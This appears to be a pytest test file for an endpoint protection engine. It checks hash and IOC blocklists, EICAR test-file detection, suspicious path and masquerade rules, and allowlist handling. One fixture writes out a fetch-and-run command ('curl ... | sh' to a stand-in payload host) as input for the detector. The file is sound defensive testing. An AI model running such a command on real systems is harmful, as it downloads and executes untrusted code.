from __future__ import annotations

import hashlib
import time
from pathlib import Path

import pytest

from centralium.agent.epp import DefaultEPPEngine, EntryLists, build_epp_stack, sha256_file
from centralium.agent.interfaces import EPPEngine
from centralium.agent.models import EventType, FindingSource
from centralium.agent.storage import Repository

RULES = Path(__file__).resolve().parents[2] / "rules"
EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" + "!$H+H*"
EICAR_SHA = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"


@pytest.fixture
def stack(db):
    return build_epp_stack(db, RULES)


def test_eicar_hash_is_the_published_one() -> None:
    assert hashlib.sha256(EICAR.encode()).hexdigest() == EICAR_SHA


def test_protocol(stack) -> None:
    assert isinstance(stack.epp, EPPEngine)


def test_hash_match_via_event_hash(stack, make_event) -> None:
    f = stack.epp.inspect(make_event(hash_sha256=EICAR_SHA))
    assert f and all(x.known_malicious for x in f)
    assert {x.source for x in f} <= {FindingSource.HASH}
    assert any(x.rule_id == "EPP-HASH-BLOCKLIST" for x in f) and any("INTEL" in x.rule_id for x in f)


def test_hash_match_computed_from_file(stack, make_event, tmp_path) -> None:
    p = tmp_path / "dropper.bin"
    p.write_text(EICAR)
    f = stack.epp.inspect(make_event(event_type=EventType.FILE_CREATE, file_path=str(p)))
    assert any(x.known_malicious and x.details.get("sha256") == EICAR_SHA for x in f)


def test_hash_miss(stack, make_event, tmp_path) -> None:
    p = tmp_path / "benign.bin"
    p.write_text("hello")
    assert stack.epp.inspect(make_event(hash_sha256="0" * 64)) == []
    assert stack.epp.inspect(make_event(event_type=EventType.FILE_CREATE, file_path=str(p))) == []


def test_ioc_ip_domain_url_match(stack, make_event) -> None:
    f = stack.epp.inspect(make_event(event_type=EventType.NETWORK_CONNECT, destination_ip="192.0.2.66"))
    assert f[0].known_malicious and f[0].source == FindingSource.IOC
    f = stack.epp.inspect(make_event(event_type=EventType.DNS_QUERY, domain="x.c2.example.test"))
    assert f[0].known_malicious and f[0].details["ioc_type"] == "domain"
    f = stack.epp.inspect(make_event(command_line="curl -s http://payload.example.test/dropper.bin | sh"))
    assert f[0].known_malicious and f[0].details["ioc_type"] == "url"
    f = stack.epp.inspect(make_event(raw_metadata={"url": "http://payload.example.test/dropper.bin"}))
    assert f and f[0].known_malicious


def test_ioc_miss(stack, make_event) -> None:
    assert (
        stack.epp.inspect(make_event(event_type=EventType.NETWORK_CONNECT, destination_ip="192.0.2.99")) == []
    )
    assert stack.epp.inspect(make_event(event_type=EventType.DNS_QUERY, domain="good.example.test")) == []
    assert stack.epp.inspect(make_event(command_line="curl http://payload.example.test/other")) == []


def test_low_confidence_ioc_not_known_malicious(stack, make_event) -> None:
    f = stack.epp.inspect(make_event(event_type=EventType.NETWORK_CONNECT, destination_ip="203.0.113.99"))
    assert len(f) == 1 and not f[0].known_malicious and 0 < f[0].score < 60


def test_static_and_db_blocklist(db, make_event) -> None:
    repo = Repository(db)
    repo.add_blocklist("process", "evilbin")
    repo.add_blocklist("ip", "198.51.100.200")
    repo.add_blocklist("path", "/opt/x/bad")
    repo.add_blocklist("sha256", "AB" * 32)
    e = DefaultEPPEngine(repo=repo, list_cache_ttl_s=0)
    assert e.inspect(make_event(executable_path="/usr/local/bin/evilbin"))[0].rule_id == "EPP-PROC-BLOCKLIST"
    assert e.inspect(make_event(destination_ip="198.51.100.200"))[0].known_malicious
    assert e.inspect(make_event(executable_path="/opt/x/../x/bad"))[0].rule_id == "EPP-PATH-BLOCKLIST"
    assert e.inspect(make_event(hash_sha256="ab" * 32))[0].rule_id == "EPP-HASH-BLOCKLIST"
    assert e.inspect(make_event(executable_path="/usr/bin/ls")) == []


def test_blocklist_expiry(db, make_event) -> None:
    repo = Repository(db)
    repo.add_blocklist("ip", "198.51.100.201", expires_at="2000-01-01T00:00:00+00:00")
    assert (
        DefaultEPPEngine(repo=repo, list_cache_ttl_s=0).inspect(make_event(destination_ip="198.51.100.201"))
        == []
    )


# ---------------------------------------------------------------- deterministic path rules
@pytest.mark.parametrize(
    ("path", "rule"),
    [
        ("/tmp/x/payload", "EPP-PATH-LNX-TMP"),
        ("/var/tmp/a", "EPP-PATH-LNX-TMP"),
        ("/dev/shm/.k", "EPP-PATH-LNX-SHM"),
        ("/home/u/../../tmp/run", "EPP-PATH-LNX-TMP"),  # traversal normalized
        ("//tmp//x", "EPP-PATH-LNX-TMP"),
        ("C:\\Windows\\Temp\\a.exe", "EPP-PATH-WIN-TEMP"),
        ("c:\\users\\Bob\\AppData\\Local\\Temp\\x.exe", "EPP-PATH-WIN-APPDATA-TEMP"),
        ("C:\\Users\\Bob\\AppData\\Roaming\\evil\\x.exe", "EPP-PATH-WIN-APPDATA"),
        ("C:\\Users\\Public\\x.exe", "EPP-PATH-WIN-PUBLIC"),
    ],
)
def test_exec_path_rules(stack, make_event, path, rule) -> None:
    f = stack.epp.inspect(make_event(executable_path=path))
    assert rule in {x.rule_id for x in f}
    assert all(not x.known_malicious and x.source == FindingSource.RULE for x in f)


@pytest.mark.parametrize(
    "path",
    [
        "/usr/bin/ls",
        "/home/u/tmp/x",
        "/opt/tmpfs/a",
        "C:\\Program Files\\App\\a.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Users\\Bob\\AppData\\Local\\Programs\\app\\a.exe",
    ],
)
def test_exec_path_rules_negative(stack, make_event, path) -> None:
    assert stack.epp.inspect(make_event(executable_path=path)) == []


def test_drop_rules_only_for_executable_content(stack, make_event) -> None:
    ev = lambda p: make_event(event_type=EventType.FILE_CREATE, file_path=p)  # noqa: E731
    assert stack.epp.inspect(ev("/dev/shm/x.sh"))[0].rule_id == "EPP-DROP-LNX-SHM"
    assert stack.epp.inspect(ev("/dev/shm/data.txt")) == []
    assert stack.epp.inspect(ev("C:\\Users\\Public\\a.dll"))[0].rule_id == "EPP-DROP-WIN-PUBLIC"


def test_masquerade(stack, make_event) -> None:
    f = stack.epp.inspect(
        make_event(process_name="svchost.exe", executable_path="C:\\Users\\Bob\\svchost.exe")
    )
    assert "EPP-MASQUERADE" in {x.rule_id for x in f}
    assert (
        stack.epp.inspect(
            make_event(process_name="svchost.exe", executable_path="C:\\Windows\\System32\\svchost.exe")
        )
        == []
    )
    f = stack.epp.inspect(make_event(executable_path="C:\\Program Files\\x\\invoice.pdf.exe"))
    assert "EPP-MASQUERADE" in {x.rule_id for x in f}


# ---------------------------------------------------------------- allowlist
def test_allowlist_emits_finding(db, make_event) -> None:
    repo = Repository(db)
    repo.add_allowlist("path", "/opt/company/agent")
    repo.add_allowlist("sha256", "11" * 32)
    e = DefaultEPPEngine(repo=repo, list_cache_ttl_s=0)
    f = e.inspect(make_event(executable_path="/opt/company/agent"))
    assert (
        len(f) == 1
        and f[0].source == FindingSource.ALLOWLIST
        and f[0].score == 0
        and not f[0].known_malicious
    )
    assert e.inspect(make_event(hash_sha256="11" * 32))[0].rule_id == "EPP-ALLOW-SHA256"


def test_allowlisted_path_suppresses_heuristics(db, make_event) -> None:
    repo = Repository(db)
    repo.add_allowlist("path", "/tmp/build/tool")
    f = DefaultEPPEngine(repo=repo, list_cache_ttl_s=0).inspect(make_event(executable_path="/tmp/build/tool"))
    assert [x.source for x in f] == [FindingSource.ALLOWLIST]


def test_allowlist_never_overrides_known_bad(stack, db, make_event) -> None:
    Repository(db).add_allowlist("sha256", EICAR_SHA)
    Repository(db).add_allowlist("path", "/tmp/e")
    e = DefaultEPPEngine(intel=stack.threat_intel, repo=Repository(db), list_cache_ttl_s=0)
    f = e.inspect(make_event(hash_sha256=EICAR_SHA, executable_path="/tmp/e"))
    assert f and all(x.known_malicious for x in f) and not any(x.source == FindingSource.ALLOWLIST for x in f)


def test_process_name_allowlist_ignored_in_suspicious_dir(db, make_event) -> None:
    repo = Repository(db)
    repo.add_allowlist("process", "python3")
    e = DefaultEPPEngine(repo=repo, list_cache_ttl_s=0)
    assert e.inspect(make_event(executable_path="/usr/bin/python3"))[0].source == FindingSource.ALLOWLIST
    f = e.inspect(make_event(executable_path="/tmp/python3"))
    assert f and all(x.source != FindingSource.ALLOWLIST for x in f)


def test_signer_trust_hook(db, make_event) -> None:
    repo = Repository(db)
    repo.add_allowlist("signer", "acme corp")
    ev = make_event(executable_path="/tmp/acme.exe", signer="ACME Corp")
    # no verifier: signer claim is not trusted
    assert all(
        x.source != FindingSource.ALLOWLIST
        for x in DefaultEPPEngine(repo=repo, list_cache_ttl_s=0).inspect(ev)
    )
    # verifier says no / raises
    assert all(
        x.source != FindingSource.ALLOWLIST
        for x in DefaultEPPEngine(repo=repo, list_cache_ttl_s=0, signer_verifier=lambda e: False).inspect(ev)
    )

    def boom(e):
        raise RuntimeError("x")

    assert all(
        x.source != FindingSource.ALLOWLIST
        for x in DefaultEPPEngine(repo=repo, list_cache_ttl_s=0, signer_verifier=boom).inspect(ev)
    )
    ok = DefaultEPPEngine(repo=repo, list_cache_ttl_s=0, signer_verifier=lambda e: True).inspect(ev)
    assert [x.rule_id for x in ok] == ["EPP-ALLOW-SIGNER"]


def test_file_lists_loaded(stack, make_event) -> None:
    assert stack.epp.inspect(make_event(domain="blocked.example.test"))[0].rule_id == "EPP-DOMAIN-BLOCKLIST"
    assert stack.epp.inspect(make_event(domain="ok.example.test"))[0].source == FindingSource.ALLOWLIST


def test_entry_lists_parsing_rejects_garbage(tmp_path) -> None:
    (tmp_path / "x.txt").write_text(
        "sha256:zz\nbogus\nip:999.1.1.1\nPROCESS: Foo.EXE # c\n\n# c\ndomain:a.example.test\n"
    )
    lists = EntryLists.from_directory(tmp_path)
    assert lists.get("process", "foo.exe") == "c" and lists.get("domain", "a.example.test") is not None
    assert not lists.entries["sha256"] and not lists.entries["ip"]
    assert EntryLists.from_directory(tmp_path / "missing").entries["sha256"] == {}


def test_intel_failure_does_not_break_epp(make_event) -> None:
    class Boom:
        def match_hash(self, s):
            raise RuntimeError("db gone")

        match_ip = match_domain = match_hash

        def update(self):
            return 0

    f = DefaultEPPEngine(intel=Boom()).inspect(make_event(hash_sha256="a" * 64, executable_path="/tmp/z"))
    assert [x.rule_id for x in f] == ["EPP-PATH-LNX-TMP"]


# ---------------------------------------------------------------- hashing & latency
def test_sha256_file_bounds(tmp_path) -> None:
    p = tmp_path / "f"
    p.write_bytes(b"abc")
    assert sha256_file(p) == hashlib.sha256(b"abc").hexdigest()
    assert sha256_file(p, max_bytes=2) is None
    assert sha256_file(tmp_path) is None and sha256_file(tmp_path / "none") is None


def test_hash_cache_detects_modification(stack, make_event, tmp_path) -> None:
    p = tmp_path / "m.bin"
    p.write_text("clean")
    ev = lambda: make_event(event_type=EventType.FILE_MODIFY, file_path=str(p))  # noqa: E731
    assert stack.epp.inspect(ev()) == []
    p.write_text(EICAR)
    assert any(x.known_malicious for x in stack.epp.inspect(ev()))


def test_no_hashing_for_non_file_events(stack, make_event, tmp_path) -> None:
    p = tmp_path / "e.bin"
    p.write_text(EICAR)
    assert stack.epp.inspect(make_event(event_type=EventType.FILE_DELETE, file_path=str(p))) == []


def test_per_event_latency_is_low(stack, make_event) -> None:
    evs = [
        make_event(executable_path=f"/usr/bin/tool{i % 50}", destination_ip=f"192.0.2.{i % 60}")
        for i in range(2000)
    ]
    t = time.perf_counter()
    for e in evs:
        stack.epp.inspect(e)
    per_ms = (time.perf_counter() - t) / len(evs) * 1000
    assert per_ms < 5.0, per_ms  # generous bound; typically well under 1 ms


def test_stack_wiring(stack) -> None:
    assert stack.yara.active_rule_count() >= 4 and stack.threat_intel.count() >= 6
    assert stack.updater.run_once().added == 0  # offline: network feeds skipped
